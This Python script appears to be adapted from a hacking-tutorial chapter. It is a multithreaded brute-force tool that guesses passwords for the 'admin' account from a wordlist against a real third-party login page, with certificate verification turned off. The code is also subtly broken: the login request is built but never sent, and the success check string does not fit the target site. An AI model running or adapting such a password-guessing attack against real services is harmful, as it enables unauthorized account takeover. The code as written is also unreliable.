import urllib.request 
import urllib
import http.cookiejar 
import threading
import sys
import queue as Queue
import ssl

from html.parser import HTMLParser

# 简要设置
user_thread   = 10
username      = "admin"
wordlist_file = "/root/black-hat/chapter5/暴力破解密码字典.txt"
resume        = None

# 特定目标设置
target_url    = "https://passport.csdn.net/login"
target_post   = "https://passport.csdn.net/login"

username_field= "username"
password_field= "passwd"

success_check = "Administration - Control Panel"


class BruteParser(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
        
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name  = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, username, words):
        self.username   = username
        self.password_q = words
        self.found      = False
        
        print ("Finished setting up for: {}".format(username))
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    
    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip().decode(encoding = 'utf-8')
            #jar = http.cookiejar.FileCookieJar("cookies")
            #opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            
            #response = opener.open(target_url)
            # 通过导入ssl模块把证书验证改成不用验证 
            ssl._create_default_https_context = ssl._create_unverified_context
            response = urllib.request.urlopen(target_url)
            page = response.read()
            
            print ("Trying: {}  : {} ({} left)".format(self.username,brute,self.password_q.qsize()))

            # 解析隐藏区域
            parser = BruteParser()
            parser.feed(page.decode(encoding='utf-8'))     
            
            post_tags = parser.tag_results
            
            # 添加用户名和密码区域
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            #login_data = urllib.urlencode(post_tags)
            login_response = urllib.request.Request(target_post,data=post_tags)
            #login_response = opener.open(target_post, login_data)
            login_result = login_response.data
            #login_result = login_response.read()
            
            
            if success_check in login_result:
                self.found = True
                
                print ("[*] Bruteforce successful.")
                print ("[*] Username: {}".format(username))
                print ("[*] Password: {}".format(brute))
                print ("[*] Waiting for other threads to exit...")

def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = Queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print ("Resuming wordlist from: %s" % resume)
                                        
        else:
            words.put(word)
    
    return words            

words = build_wordlist(wordlist_file)


bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()

